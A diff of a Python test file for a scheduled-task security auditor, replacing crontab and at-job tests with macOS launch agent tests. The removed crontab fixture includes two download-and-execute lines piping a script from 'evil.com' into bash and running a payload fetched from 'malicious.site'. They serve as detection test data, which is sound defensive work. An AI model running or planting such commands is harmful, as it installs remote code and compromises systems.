@@ -1,6 +1,7 @@
 import sys
 from pathlib import Path
 from unittest.mock import patch, MagicMock
+import plistlib
 import pytest
 
 sys.path.insert(0, str(Path(__file__).parent.parent))
@@ -27,237 +28,251 @@ def _get_module():
     return next(m for m in modules if m.name == "scheduled_tasks_audit")
 
 
-def _make_subprocess_result(stdout="", stderr="", returncode=0):
-    result = MagicMock()
-    result.stdout = stdout
-    result.stderr = stderr
-    result.returncode = returncode
-    return result
-
-
-def _fake_clean_crontab():
-    """Normal case: no crontab"""
-    def fake_run(cmd, **kwargs):
-        if isinstance(cmd, list):
-            cmd_str = " ".join(cmd)
-        else:
-            cmd_str = cmd
-
-        if "crontab -l" in cmd_str:
-            # No crontab
-            return _make_subprocess_result("", "no crontab for root", 1)
-        elif "atq" in cmd_str:
-            # No at jobs
-            return _make_subprocess_result("", "", 0)
-
-        return _make_subprocess_result()
-    return fake_run
-
-
-def _fake_healthy_crontab():
-    """Case with legitimate crontab entries"""
-    def fake_run(cmd, **kwargs):
-        if isinstance(cmd, list):
-            cmd_str = " ".join(cmd)
-        else:
-            cmd_str = cmd
-
-        if "crontab -l" in cmd_str:
-            return _make_subprocess_result(
-                "0 9 * * * /usr/local/bin/backup.sh\n"
-                "0 12 * * * /usr/bin/python3 /opt/check_mail.py\n"
-            )
-        elif "atq" in cmd_str:
-            # No at jobs
-            return _make_subprocess_result("", "", 0)
-
-        return _make_subprocess_result()
-    return fake_run
-
-
-def _fake_suspicious_curl_crontab():
-    """Case with curl/wget downloading remote content"""
-    def fake_run(cmd, **kwargs):
-        if isinstance(cmd, list):
-            cmd_str = " ".join(cmd)
-        else:
-            cmd_str = cmd
-
-        if "crontab -l" in cmd_str:
-            return _make_subprocess_result(
-                "0 * * * * curl http://evil.com/malware.sh | bash\n"
-                "0 9 * * * /usr/local/bin/backup.sh\n"
-                "30 */2 * * * wget -q http://malicious.site/payload -O /tmp/p && /tmp/p\n"
-            )
-        elif "atq" in cmd_str:
-            return _make_subprocess_result("", "", 0)
-
-        return _make_subprocess_result()
-    return fake_run
-
-
-def _fake_with_at_jobs():
-    """Case with at jobs"""
-    def fake_run(cmd, **kwargs):
-        if isinstance(cmd, list):
-            cmd_str = " ".join(cmd)
-        else:
-            cmd_str = cmd
-
-        if "crontab -l" in cmd_str:
-            return _make_subprocess_result(
-                "0 9 * * * /usr/local/bin/backup.sh\n"
-            )
-        elif "atq" in cmd_str:
-            return _make_subprocess_result(
-                "5    Mon Jul  7 15:00:00 2026 a root\n"
-                "6    Tue Jul  8 10:30:00 2026 a testuser\n"
-            )
-
-        return _make_subprocess_result()
-    return fake_run
-
-
-def _fake_var_at_tabs():
-    """Case with entries in /var/at/tabs/"""
-    def fake_run(cmd, **kwargs):
-        if isinstance(cmd, list):
-            cmd_str = " ".join(cmd)
-        else:
-            cmd_str = cmd
-
-        if "crontab -l" in cmd_str:
-            return _make_subprocess_result("", "no crontab", 1)
-        elif "atq" in cmd_str:
-            return _make_subprocess_result("", "", 0)
-
-        return _make_subprocess_result()
-    return fake_run
+def _make_plist(label: str, program: str = "", disabled: bool = False) -> dict:
+    """Create a minimal plist dict for a launch agent."""
+    plist = {
+        "Label": label,
+        "RunAtLoad": True,
+    }
+    if program:
+        plist["Program"] = program
+    if disabled:
+        plist["Disabled"] = True
+    return plist
 
 
 def test_scheduled_tasks_audit_discovered():
+    """Test that module is discovered and has correct metadata."""
     mod = _get_module()
     assert mod.name == "scheduled_tasks_audit"
     assert mod.category == "security"
     assert mod.risk_level == RiskLevel.SAFE
+    assert Platform.DARWIN in mod.platforms
 
 
-def test_scheduled_tasks_audit_clean():
-    """Test with no crontab and no at jobs"""
+def test_scheduled_tasks_audit_empty_directories():
+    """Test with no launch agents/daemons found."""
     mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_clean_crontab()):
+
+    def mock_glob(pattern):
+        return []
+
+    with patch.object(Path, "exists", return_value=False):
         result = mod.check(_make_profile())
 
-    assert result.has_issues  # Should have INFO findings for clean state
-    # Should have INFO findings saying no crontab and no at jobs
-    assert any(
-        f.severity == Severity.INFO
-        and "no user crontab" in f.title.lower()
-        for f in result.findings
-    )
-    assert any(
-        f.severity == Severity.INFO
-        and "no at jobs" in f.title.lower()
-        for f in result.findings
-    )
+    # Should have no findings if no directories exist
+    assert not result.has_issues
 
 
-def test_scheduled_tasks_audit_healthy_crontab():
-    """Test with legitimate crontab entries"""
+def test_scheduled_tasks_audit_legitimate_agents():
+    """Test with legitimate Apple launch agents."""
     mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_healthy_crontab()):
+
+    def mock_scan(directory, agent_type):
+        """Mock scan that returns legitimate agents."""
+        from rescue.models import Finding
+        findings = []
+        if "LaunchAgents" in str(directory):
+            for label in ["com.apple.Spotlight", "com.google.Chrome.update"]:
+                findings.append(
+                    Finding(
+                        title=f"Launch {agent_type}: {label}",
+                        description=f"Launch {agent_type} found: {label}",
+                        severity=Severity.INFO,
+                        category="security",
+                        data={
+                            "check": "launch_agent_info",
+                            "label": label,
+                            "type": agent_type,
+                        },
+                    )
+                )
+        return findings
+
+    with patch.object(mod, "_scan_launch_agents", side_effect=mock_scan):
         result = mod.check(_make_profile())
 
-    assert result.has_issues
-    # Should have INFO findings for each crontab entry
-    assert any(
-        f.severity == Severity.INFO
-        and "crontab entry found" in f.title.lower()
-        for f in result.findings
-    )
-    # Should not have any WARNING findings
-    assert not any(
-        f.severity == Severity.WARNING
-        for f in result.findings
-    )
+    # Should have no critical issues with legitimate agents
+    assert not any(f.severity == Severity.WARNING for f in result.findings)
 
 
-def test_scheduled_tasks_audit_suspicious_curl():
-    """Test with curl/wget downloading remote content"""
+def test_scheduled_tasks_audit_suspicious_tmp_agent():
+    """Test detection of agent running from /tmp."""
     mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_suspicious_curl_crontab()):
-        result = mod.check(_make_profile())
 
-    assert result.has_issues
-    # Should have WARNING for curl downloading remote content
-    assert any(
-        f.severity == Severity.WARNING
-        and "downloads or executes remote content" in f.description.lower()
-        and f.data.get("check") == "remote_content_in_crontab"
-        for f in result.findings
-    )
-    # Should also have INFO for the backup crontab
-    assert any(
-        f.severity == Severity.INFO
-        and "crontab entry found" in f.title.lower()
-        for f in result.findings
-    )
+    # Mock Path operations
+    user_agents_path = Path.home() / "Library/LaunchAgents"
+
+    def mock_glob(self, pattern):
+        if self == user_agents_path:
+            return [user_agents_path / "com.malware.suspicious.plist"]
+        return []
+
+    def mock_exists(self):
+        return str(self) in [
+            str(user_agents_path),
+            str(Path("/Library/LaunchAgents")),
+            str(Path("/Library/LaunchDaemons")),
+        ]
+
+    def mock_plist_load(f):
+        return _make_plist(
+            "com.malware.suspicious",
+            program="/tmp/malicious_script.sh"
+        )
+
+    with patch.object(Path, "glob", mock_glob):
+        with patch.object(Path, "exists", mock_exists):
+            with patch("plistlib.load", mock_plist_load):
+                with patch("builtins.open", create=True):
+                    result = mod.check(_make_profile())
+
+    # Should detect suspicious path
+    suspicious = [f for f in result.findings if f.severity == Severity.WARNING]
+    assert len(suspicious) > 0
+    assert any("suspicious" in f.title.lower() for f in suspicious)
 
 
-def test_scheduled_tasks_audit_with_at_jobs():
-    """Test with at jobs"""
+def test_scheduled_tasks_audit_disabled_agents_clutter():
+    """Test detection of disabled agents (clutter)."""
     mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_with_at_jobs()):
-        result = mod.check(_make_profile())
 
-    assert result.has_issues
-    # Should have INFO findings for at jobs
-    assert any(
-        f.severity == Severity.INFO
-        and "at job found" in f.title.lower()
-        and f.data.get("check") == "at_job_info"
-        for f in result.findings
-    )
+    user_agents_path = Path.home() / "Library/LaunchAgents"
+
+    def mock_glob(self, pattern):
+        if self == user_agents_path:
+            return [user_agents_path / "com.example.disabled.plist"]
+        return []
+
+    def mock_exists(self):
+        return str(self) in [
+            str(user_agents_path),
+            str(Path("/Library/LaunchAgents")),
+            str(Path("/Library/LaunchDaemons")),
+        ]
+
+    def mock_plist_load(f):
+        return _make_plist(
+            "com.example.disabled",
+            program="/Applications/Example.app/Contents/MacOS/Example",
+            disabled=True
+        )
+
+    with patch.object(Path, "glob", mock_glob):
+        with patch.object(Path, "exists", mock_exists):
+            with patch("plistlib.load", mock_plist_load):
+                with patch("builtins.open", create=True):
+                    result = mod.check(_make_profile())
+
+    # Should detect disabled agents
+    disabled = [f for f in result.findings if f.data.get("check") == "disabled_launch_agent"]
+    assert len(disabled) > 0
+    assert disabled[0].severity == Severity.INFO
+
+
+def test_scheduled_tasks_audit_excessive_agents():
+    """Test WARNING when more than 20 user-level agents."""
+    mod = _get_module()
+
+    user_agents_path = Path.home() / "Library/LaunchAgents"
+
+    def mock_glob(self, pattern):
+        if self == user_agents_path:
+            # Return 25 plists
+            return [user_agents_path / f"com.example.agent{i}.plist" for i in range(25)]
+        return []
+
+    def mock_exists(self):
+        return str(self) in [
+            str(user_agents_path),
+            str(Path("/Library/LaunchAgents")),
+            str(Path("/Library/LaunchDaemons")),
+        ]
+
+    def mock_plist_load(f):
+        # Return a different label for each call
+        return _make_plist(f"com.example.agent{id(f)}")
+
+    with patch.object(Path, "glob", mock_glob):
+        with patch.object(Path, "exists", mock_exists):
+            with patch("plistlib.load", mock_plist_load):
+                with patch("builtins.open", create=True):
+                    result = mod.check(_make_profile())
+
+    # Should have WARNING about excessive agents
+    excessive = [f for f in result.findings if f.data.get("check") == "excessive_user_agents"]
+    assert len(excessive) > 0
+    assert excessive[0].severity == Severity.WARNING
+    assert "25" in excessive[0].description or "excessive" in excessive[0].title.lower()
 
 
 def test_scheduled_tasks_audit_fix_is_informational():
-    """Test that fix() returns informational actions"""
+    """Test that fix() returns informational actions."""
     mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_suspicious_curl_crontab()):
-        check = mod.check(_make_profile())
-        fix = mod.fix(check, Mode.MANUAL)
 
-    # fix() should always succeed with informational messages
-    assert fix.all_succeeded
-    # Should have at least one action
-    assert len(fix.actions) > 0
+    # Create mock findings
+    findings = [
+        mock_finding("suspicious_launch_agent", "com.malware", "suspicious path"),
+        mock_finding("disabled_launch_agent", "com.old.app", ""),
+    ]
+
+    from rescue.models import CheckResult
+    check_result = CheckResult(module_name="scheduled_tasks_audit", findings=findings)
+
+    fix = mod.fix(check_result, Mode.MANUAL)
+
     # All actions should succeed
+    assert fix.all_succeeded
+    assert len(fix.actions) == 2
     for action in fix.actions:
         assert action.success
         assert action.risk_level == RiskLevel.SAFE
 
 
-def test_scheduled_tasks_audit_fix_remote_content():
-    """Test fix() response for remote content warnings"""
+def test_scheduled_tasks_audit_fix_suspicious_agent():
+    """Test fix() response for suspicious agents."""
     mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_suspicious_curl_crontab()):
-        check = mod.check(_make_profile())
-        fix = mod.fix(check, Mode.MANUAL)
 
-    # Should have action for reviewing suspicious crontab entry
-    assert any(
-        "remote content" in a.title.lower()
-        or "suspicious" in a.title.lower()
-        for a in fix.actions
+    findings = [
+        mock_finding("suspicious_launch_agent", "com.malware.bad", "suspicious path: /tmp/evil"),
+    ]
+
+    from rescue.models import CheckResult
+    check_result = CheckResult(module_name="scheduled_tasks_audit", findings=findings)
+
+    fix = mod.fix(check_result, Mode.MANUAL)
+
+    # Should have action for reviewing suspicious agent
+    assert any("review" in a.title.lower() and "suspicious" in a.title.lower() for a in fix.actions)
+
+
+def test_scheduled_tasks_audit_fix_excessive_agents():
+    """Test fix() response for excessive agents."""
+    mod = _get_module()
+
+    findings = [
+        mock_finding("excessive_user_agents", "", "", extra_data={"count": 25}),
+    ]
+
+    from rescue.models import CheckResult
+    check_result = CheckResult(module_name="scheduled_tasks_audit", findings=findings)
+
+    fix = mod.fix(check_result, Mode.MANUAL)
+
+    # Should have action for reducing agents
+    assert any("reduce" in a.title.lower() or "excessive" in a.title.lower() for a in fix.actions)
+
+
+def mock_finding(check_type: str, label: str = "", reason: str = "", extra_data: dict = None):
+    """Helper to create mock findings."""
+    from rescue.models import Finding
+    data = {"check": check_type, "label": label, "reason": reason}
+    if extra_data:
+        data.update(extra_data)
+    return Finding(
+        title=f"Test finding: {check_type}",
+        description="Test description",
+        severity=Severity.WARNING if check_type.startswith("suspicious") else Severity.INFO,
+        category="security",
+        data=data,
     )
-
-
-def test_scheduled_tasks_audit_var_at_tabs_no_permission():
-    """Test /var/at/tabs scanning with no permission errors handled gracefully"""
-    mod = _get_module()
-    with patch("subprocess.run", side_effect=_fake_var_at_tabs()):
-        with patch("pathlib.Path.iterdir", side_effect=PermissionError()):
-            # Should handle permission errors gracefully
-            result = mod.check(_make_profile())
-    # Should still have basic findings
-    assert result.has_issues
